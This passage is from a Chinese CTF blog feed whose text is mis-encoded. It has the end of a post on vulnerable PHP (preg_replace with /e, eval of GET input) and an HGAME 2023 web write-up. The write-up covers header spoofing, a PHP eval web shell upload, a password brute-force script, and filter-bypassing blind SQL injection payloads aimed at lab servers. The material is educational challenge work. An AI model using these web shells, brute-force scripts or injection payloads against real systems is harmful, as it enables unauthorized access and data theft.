class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;<span class="comment">//ç›®çš„æ˜¯ä¸ºäº†åœ¨ä¼šè¯ä¸­ä¿ç•™ $id å€¼ï¼Œä»¥å¤‡åç»­çš„æ“ä½œä½¿ç”¨ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;<span class="comment">//re:regular expression</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ä¸€ã€&#x27;/&#x27; æ˜¯æ­£åˆ™è¡¨è¾¾å¼çš„åˆ†éš”ç¬¦ï¼Œ&quot;()&quot; è¡¨ç¤ºæ•è·åˆ†ç»„</span></span><br><span class="line"><span class="comment">äºŒã€ei æ˜¯ä¿®é¥°ç¬¦ï¼Œå…¶ä¸­ e è¡¨ç¤ºæ›¿æ¢å­—ç¬¦ä¸²ä½œä¸º PHP ä»£ç è¿›è¡Œæ‰§è¡Œï¼Œi è¡¨ç¤ºåŒ¹é…ä¸åŒºåˆ†å¤§å°å†™ã€‚</span></span><br><span class="line"><span class="comment">å­—ç¬¦ä¸²è¿æ¥è¿ç®—ç¬¦&#x27;.&#x27;å°†å­—ç¬¦ä¸² &#x27;(&#x27; $re å’Œ &#x27;)&#x27; è¿æ¥åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ã€‚</span></span><br><span class="line"><span class="comment">å¦‚æœ $re çš„å€¼æ˜¯ &#x27;abc&#x27;ï¼Œé‚£ä¹ˆå­—ç¬¦ä¸²è¿æ¥è¿ç®—ç¬¦å°†äº§ç”Ÿ &#x27;(abc)&#x27;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¡¥å……çŸ¥è¯†ï¼š</p><ol><li><p>åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ï¼Œæ‹¬å·å…·æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œå¹¶ç”¨äºå¤šç§ç›®çš„ã€‚ä»¥ä¸‹æ˜¯å¸¸è§çš„æ‹¬å·ç”¨æ³•ï¼š</p><p>â€‹    æ•è·ç»„ <code>( )</code>ï¼šæ‹¬å·å¯ä»¥ç”¨äºåˆ›å»ºæ•è·ç»„ï¼Œå°†åŒ¹é…çš„å­å­—ç¬¦ä¸²æå–å‡ºæ¥ä»¥ä¾›åç»­å¼•ç”¨æˆ–å¤„ç†ã€‚</p><p>â€‹        ä¾‹å¦‚ï¼Œæ­£åˆ™è¡¨è¾¾å¼ <code>(abc)+</code> ä¸­çš„ <code>(abc)</code> æ˜¯ä¸€ä¸ªæ•è·ç»„ï¼Œè¡¨ç¤ºåŒ¹é…è¿ç»­å‡ºç°çš„ â€œabcâ€ å­å­—ç¬¦ä¸²ã€‚</p><p>â€‹    éæ•è·ç»„ <code>(?: )</code>ï¼šæ‹¬å·å‰åŠ ä¸Š <code>?:</code>ï¼Œå¯ä»¥åˆ›å»ºéæ•è·ç»„ï¼Œç”¨äºåŒ¹é…ä½†ä¸æ•è·åŒ¹é…çš„å†…å®¹ã€‚</p><p>â€‹        ä¾‹å¦‚ï¼Œæ­£åˆ™è¡¨è¾¾å¼ <code>(?:abc)+</code> ä¸­çš„ <code>(?:abc)</code> æ˜¯ä¸€ä¸ªéæ•è·ç»„ï¼Œè¡¨ç¤ºåŒ¹é…è¿ç»­å‡ºç°çš„ â€œabcâ€ å­å­—ç¬¦ä¸²ï¼Œä½†        ä¸æ•è·å®ƒä»¬ã€‚</p><p>â€‹    åˆ†ç»„å’Œé¡ºåº <code>( )</code>ï¼šæ‹¬å·å¯ä»¥ç”¨äºåˆ†ç»„å’Œç¡®å®šåŒ¹é…çš„é¡ºåºã€‚</p><p>â€‹        ä¾‹å¦‚ï¼Œæ­£åˆ™è¡¨è¾¾å¼ <code>(abc|def)</code> è¡¨ç¤ºåŒ¹é… â€œabcâ€ æˆ– â€œdefâ€ã€‚</p></li><li><p><code>(abc)+</code> è¡¨ç¤ºåŒ¹é…è¿ç»­å‡ºç°çš„ â€œabcâ€ å­å­—ç¬¦ä¸²ï¼Œå…¶ä¸­æ‹¬å· <code>(abc)</code> è¡¨ç¤ºæ•è·ç»„ï¼Œ<code>+</code> è¡¨ç¤ºå‰é¢çš„æ•è·ç»„å¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚</p><p>â€‹    ä¾‹å¦‚ï¼Œè¯¥æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥åŒ¹é… â€œabcâ€ã€â€abcabcâ€ã€â€abcabcabcâ€ ç­‰è¿ç»­å‡ºç°å¤šæ¬¡çš„ â€œabcâ€ å­å­—ç¬¦ä¸²ã€‚</p><p>â€‹    <strong>ä¸ä¼šåŒ¹é…å•ä¸ªçš„ â€œabcâ€</strong>ï¼Œå› ä¸º <code>+</code> è¦æ±‚å‰é¢çš„å…ƒç´ è‡³å°‘å‡ºç°ä¸€æ¬¡ã€‚</p></li><li><p><code>strtolower(&quot;\\1&quot;)</code> æ˜¯ä¸€ä¸ª PHP çš„å‡½æ•°è°ƒç”¨ï¼Œç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™å­—æ¯å½¢å¼ã€‚</p><ul><li><code>strtolower()</code> æ˜¯ä¸€ä¸ª PHP å†…ç½®å‡½æ•°ï¼Œç”¨äº<strong>å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™å­—æ¯å½¢å¼</strong>ã€‚</li><li><code>\\1</code> æ˜¯ä¸€ä¸ªè½¬ä¹‰åºåˆ—ï¼Œè¡¨ç¤ºè¦å¼•ç”¨æ­£åˆ™è¡¨è¾¾å¼ä¸­ç¬¬ä¸€ä¸ªæ•è·ç»„çš„åŒ¹é…ç»“æœã€‚</li><li>åœ¨è¿™ä¸ªè¡¨è¾¾å¼ä¸­ï¼Œ<code>strtolower(&quot;\\1&quot;)</code> çš„ä½œç”¨æ˜¯å°†æ­£åˆ™è¡¨è¾¾å¼ä¸­ç¬¬ä¸€ä¸ªæ•è·ç»„çš„åŒ¹é…ç»“æœè½¬æ¢ä¸ºå°å†™å­—æ¯å½¢å¼ã€‚</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUåˆ·é¢˜ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgamectf</title>
      <link href="/2023/02/05/0_PWN/2023hgamectf/"/>
      <url>/2023/02/05/0_PWN/2023hgamectf/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Web like high sky  , Pwn like deep sea .</p></blockquote><span id="more"></span><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-Classic-Childhood-Game"><a href="#1-Classic-Childhood-Game" class="headerlink" title="1.Classic Childhood Game"></a>1.Classic Childhood Game</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.2s20ylq8l48w.webp"></p><p>â€‹    æ‰“å¼€ç½‘ç«™å‘ç°æ˜¯ä¸€ä¸ªæ¸¸æˆï¼Œæˆ‘çš„æ€è·¯æœ‰ä¸‹ï¼š</p><ol><li>ä¿®æ”¹åˆ†æ•°ç±»å‹ã€‚</li><li>è—åœ¨æºç ç±»å‹ã€‚</li><li>æºç ä¸­æœ‰éšè—å‡½æ•°ï¼Œæ‰¾åˆ°è¯¥å‡½æ•°ï¼Œæ”¾åœ¨consoleä¸­æ‰§è¡Œç±»å‹ã€‚</li></ol><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.34fvdqk9vsw0.webp"></p><p>æŸ¥çœ‹æºç å‘ç°äº†ä¸€ä¸ªè§£å¯†å‡½æ•°<code>mota()</code>ï¼Œåœ¨consoleä¸­è¿è¡Œå¾—åˆ°flagã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.17w2gm24rlgg.webp"></p><p>å‘ç°ä¸€ä¸ªå¥½ç©çš„ç½‘ç«™ï¼š<a class="link" href="https://cyberchef.cn/">cyberchef<i class="fas fa-external-link-alt"></i></a>ï¼Œç›´æ¥è§£ç å¾—åˆ°flagã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.6m8tldhv8eio.webp"></p><h2 id="2-Become-A-Member"><a href="#2-Become-A-Member" class="headerlink" title="2.Become A Member"></a>2.Become A Member</h2><blockquote><p>å­¦æ ¡é€šçŸ¥æ”¾å¯’å‡å•¦ï¼Œå…”å…”å…´é«˜é‡‡çƒˆçš„æ‰“ç®—è´­ä¹°å›å®¶çš„è½¦ç¥¨ï¼Œè¿™æ—¶å…”å…”å‘ç°æˆä¸ºè´­ç¥¨ç½‘ç«™çš„ä¼šå‘˜è´¦æˆ·å¯ä»¥çœä¸‹ä¸€ç¬”moneyâ€¦â€¦ æƒ³æˆä¸ºä¼šå‘˜ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦ä¸€ç‚¹ç‚¹HTTPçš„çŸ¥è¯†â€¦â€¦ç­‰ä¸‹ï¼ŒHTTPæ˜¯ä»€ä¹ˆï¼Œå¯ä»¥åƒå—?</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># è¯·å…ˆæä¾›ä¸€ä¸‹èº«ä»½è¯æ˜ï¼ˆCute-Bunnyï¼‰å“¦</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line"># æ¯ä¸€ä¸ªèƒ½å¤Ÿæˆä¸ºä¼šå‘˜çš„é¡¾å®¢ä»¬éƒ½åº”è¯¥æŒæœ‰åä¸ºVidarçš„é‚€è¯·ç ï¼ˆcodeï¼‰</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line"># ç”±äºç‰¹æ®ŠåŸå› ï¼Œæˆ‘ä»¬åªæ¥æ”¶æ¥è‡ªäºbunnybunnybunny.comçš„ä¼šå‘˜èµ„æ ¼ç”³è¯·</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line"># å°±å·®æœ€åä¸€ä¸ªæœ¬åœ°çš„è¯·æ±‚ï¼Œå°±èƒ½æ‹¿åˆ°ä¼šå‘˜è´¦å·å•¦</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.7g0wbyz9iruo.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.4ttazxhd4k5c.webp"></p><h2 id="3-Guess-Who-I-Am"><a href="#3-Guess-Who-I-Am" class="headerlink" title="3.Guess Who I Am"></a>3.Guess Who I Am</h2><blockquote><p>åˆšåŠ å…¥Vidarçš„å…”å…”è¿˜è®¤ä¸æ¸…åä¼šæˆå‘˜è¯¶ï¼Œå­¦é•¿è¦æ±‚çš„ç­”å¯¹100æ¬¡é—®é¢˜å¯å¤ªéš¾äº†ï¼Œä½ èƒ½å¸®å…”å…”å†™ä¸ªè„šæœ¬ç­”é¢˜å—ï¼Ÿ</p></blockquote><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.53vjyq5roohs.webp"></p><p>æ‰“å¼€æºç ï¼Œå‘ç°<code>Hint</code></p><p>è¾“å…¥è¯¥æ–‡æ¡£å¯¹åº”çš„idï¼Œå¯¹åº”æ­£ç¡®åˆ™Score++</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1br74mg4m23k.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.16ei54k72grk.webp"></p><p>â€‹    æ ¹æ®é¢˜ç›®è¯´æ˜ï¼Œå½“<code>score&gt;=100</code>ä¼šè¾“å‡ºflagã€‚</p><p>â€‹    å†™ä¸ªè„šæœ¬ï¼ŒæˆåŠŸå¾—åˆ°flagï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.30cki5fxsf0g.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">answer= [hinté¡µä¿¡æ¯]</span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="comment"># ä¿æŒä¼šè¯</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    getscore = <span class="string">&quot;http://week-1.hgame.lwsec.cn:30010/api/getScore&quot;</span></span><br><span class="line">    <span class="comment"># è·å–åˆ†æ•° GET</span></span><br><span class="line">    getquestion = <span class="string">&#x27;http://week-1.hgame.lwsec.cn:30010/api/getQuestion&#x27;</span></span><br><span class="line">    <span class="comment"># æé—®ä¿¡æ¯ GET</span></span><br><span class="line">    verifyanswer = <span class="string">&quot;http://week-1.hgame.lwsec.cn:30010/api/verifyAnswer&quot;</span></span><br><span class="line">    <span class="comment"># ç­”é¢˜ POST</span></span><br><span class="line">    r1 = s.get(getscore)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;hgame&quot;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">        <span class="built_in">print</span>(r1.json()[<span class="string">&quot;message&quot;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># æœ€åæ‰“å°flag</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r2 = s.get(getquestion)</span><br><span class="line">        data1 = r2.json()</span><br><span class="line">        find_id=data1[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> answer:</span><br><span class="line">            <span class="keyword">if</span> find_id <span class="keyword">in</span> j.values():</span><br><span class="line">                <span class="built_in">id</span> = j[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>:<span class="built_in">id</span>&#125;</span><br><span class="line">        r3 = s.post(verifyanswer,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Correct answer!&quot;</span> <span class="keyword">in</span> r3.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ç¬¬<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>æ¬¡æ­£ç¡®&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="4-Show-Me-Your-Beauty"><a href="#4-Show-Me-Your-Beauty" class="headerlink" title="4.Show Me Your Beauty"></a>4.Show Me Your Beauty</h2><blockquote><p>ç™»é™†äº†ä¹‹å‰è·å–çš„ä¼šå‘˜è´¦å·ä¹‹åï¼Œå…”å…”æƒ³æ‰¾ä¸€å¼ è‡ªå·±çš„å¯çˆ±ç…§ç‰‡ï¼Œä¸Šä¼ åˆ°ä¸ªäººä¿¡æ¯çš„å¤´åƒä¸­ :D ä¸è¿‡å¥½åƒå¯ä»¥ä¸Šä¼ äº›å¥‡æ€ªåç¼€åçš„æ–‡ä»¶è¯¶ XD</p></blockquote><p><code>æ–‡ä»¶ä¸Šä¼ </code></p><p>è¿™é“é¢˜éš¾åº¦ä¸å¤§ï¼Œè®©æˆ‘å¾ˆå¥½åœ°å›å¿†äº†æ–‡ä»¶ä¸Šä¼ ç±»é¢˜ç›®ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;b&#x27;])?&gt;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.5cc3qg06awzk.webp"></p><p>å‰‘èšè¿æ¥</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.1n19hkwmzfcw.webp"></p><p>å¾—åˆ°flag</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230205/%E5%9B%BE%E7%89%87.3n05ae4vtio0.webp"></p><h2 id="5-Git-Leakage"><a href="#5-Git-Leakage" class="headerlink" title="5.Git Leakage"></a>5.Git Leakage</h2><blockquote><p>ç”µè§†å‰§é‡Œçš„é»‘å®¢?çœŸæ­£çš„é»‘å®¢ï¼</p></blockquote><p>â€‹    é¢˜ç›®è¿˜æŒºç‚«é…·çš„ï¼Œé¢˜ç›®æç¤ºï¼Œä½¿ç”¨<code>GitHack</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.1lhttixd9s68.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.31p7l6ffy60w.webp"></p><p>ç”¨è®°äº‹æœ¬æ‰“å¼€ä¸‹è½½åˆ°çš„æ–‡ä»¶<code>Th1s_1s-flag</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.3wekfqh4nzb4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.3z35si9dzz28.webp"></p><h3 id="6-v2board"><a href="#6-v2board" class="headerlink" title="6.v2board"></a>6.v2board</h3><blockquote><p>è¯·å°è¯•è·å–Adminç”¨æˆ·çš„è®¢é˜…é“¾æ¥ï¼Œflagæ ¼å¼ä¸ºhgame{adminç”¨æˆ·è®¢é˜…é“¾æ¥ä¸­çš„tokenå€¼}ã€‚</p></blockquote><p>éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç™»é™†æ—¶å€™<code>burp</code>æŠ“åŒ…ï¼Œå›æŠ¥æŠ¥æ–‡ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.6r7foqrscpog.webp"></p><p>å‚è€ƒè¿™ç¯‡åšæ–‡ï¼š<a class="link" href="http://wiki.peiqi.tech/wiki/webapp/V2Board/V2Board%20Admin.php%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html">v2boardæ¼æ´<i class="fas fa-external-link-alt"></i></a></p><h2 id="7-Search-Commodity"><a href="#7-Search-Commodity" class="headerlink" title="7.Search Commodity"></a>7.Search Commodity</h2><blockquote><p>R1esbyfeç»™å…”å…”å†™äº†ä¸€ä¸ªç®€æ˜“çš„æŸ¥è¯¢é¢æ¿ï¼Œåªéœ€è¦è¾“å…¥idæ•°å­—ï¼Œå°±å¯ä»¥æŸ¥åˆ°å…”å…”æœ€è¿‘ä¹°çš„ä¸œè¥¿ï¼ˆåŒ…æ‹¬å¹´è´§ï¼‰ R1esbyfe:â€é¢æ¿ç™»é™†ç”¨æˆ·åæ˜¯user01,å¯†ç â€¦â€¦å¿˜äº†ï¼Œåæ­£æ˜¯ä¸ªæ¯”è¾ƒå¥½çŒœçš„å¯†ç â€ è²Œä¼¼R1esbyfeè¿˜è—äº†ç‚¹æƒŠå–œï¼Œä½ èƒ½å¸®åŠ©å…”å…”æ‰¾åˆ°å®ƒå—ï¼Ÿ (æ•°æ®åº“å¯åŠ¨éœ€è¦æ—¶é—´ï¼Œè‹¥å‡ºç°Internal Errorï¼Œéœ€è¦ç¨ç­‰ç‰‡åˆ»)</p><p>HINTS:</p><p>å¯†ç æ˜¯å¼±å¯†ç ï¼Œå¯ä»¥è‡ªå·±æ‰¾ä¸ªdictçˆ†ç ´ä¸€ä¸‹</p></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://week-2.hgame.lwsec.cn:30157/login&quot;</span></span><br><span class="line">    dic = <span class="built_in">open</span>(<span class="string">&quot;D:\\æ¡Œé¢\\dic.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        req = requests.post(url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;user01&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: i</span><br><span class="line">        &#125;).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Login Failed&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(n,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;å¤±è´¥&#x27;</span>)</span><br><span class="line">            n = n+<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.6jx11tsbsnb4.webp"></p><p>å¯†ç ä¸º<code>admin123</code></p><p>SESSION:<code>MTY3NjI5ODQ1NHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT185BEJlWrGICqjjLJ6-FuHpARovClYOXGJmlKv7-KmpIs=</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.1tpf0sji5lj4.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.43ohcls3a6ps.webp"></p><p>â€‹    ç¼–å†™äº†ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºæ¢æµ‹è¯­å¥è¢«è¿‡æ»¤çš„æƒ…å†µï¼š<mark>(å¾…æŸ¥çœ‹)</mark></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://week-2.hgame.lwsec.cn:30157/search&quot;</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    trytxt = <span class="string">&quot;0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(name),1/*a*/frOm/*a*/information_schema.tables/*a*/whEre/*a*/table_schema/*a*/LiKe/*a*/datAbase()#&quot;</span></span><br><span class="line">    curr_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> curr_index &gt;= <span class="built_in">len</span>(trytxt):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i = <span class="built_in">ord</span>(trytxt[curr_index])</span><br><span class="line">        ret = requests.post(url, data=&#123;</span><br><span class="line">            <span class="string">&#x27;search_id&#x27;</span>: <span class="string">&#x27;if(ascii(substr(&quot;%s&quot;, %s, 1))-%s, 1, 0)  #&#x27;</span> % (trytxt, index + <span class="number">1</span>, i)</span><br><span class="line">        &#125;, headers=&#123;</span><br><span class="line">            <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;SESSION=MTY3NjI5ODQ1NHxEdi1CQkFFQ180SUFBUkFCRUFBQUpQLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBZ0FCblZ6WlhJd01RPT185BEJlWrGICqjjLJ6-FuHpARovClYOXGJmlKv7-KmpIs=&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;hard disk&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.text:</span><br><span class="line">            s += <span class="built_in">chr</span>(i)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">        curr_index += <span class="number">1</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(table_name),1/*a*/frOm/*a*/infOrmation_schema.tables/*a*/whEre/*a*/table_schema/*a*/LiKe/*a*/datAbase()#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(column_name),1/*a*/frOm/*a*/infOrmation_schema.columns/*a*/whEre/*a*/table_name/*a*/LiKe/*a*/&#x27;5ecret15here&#x27;#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0/*a*/UNion/*a*/SELECt/*a*/1,group_Concat(f14gggg1shere),1/*a*/frOm/*a*/5ecret15here#</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230213/%E5%9B%BE%E7%89%87.48zi2qquby2o.webp"></p><p>å‚è€ƒwp: <a class="link" 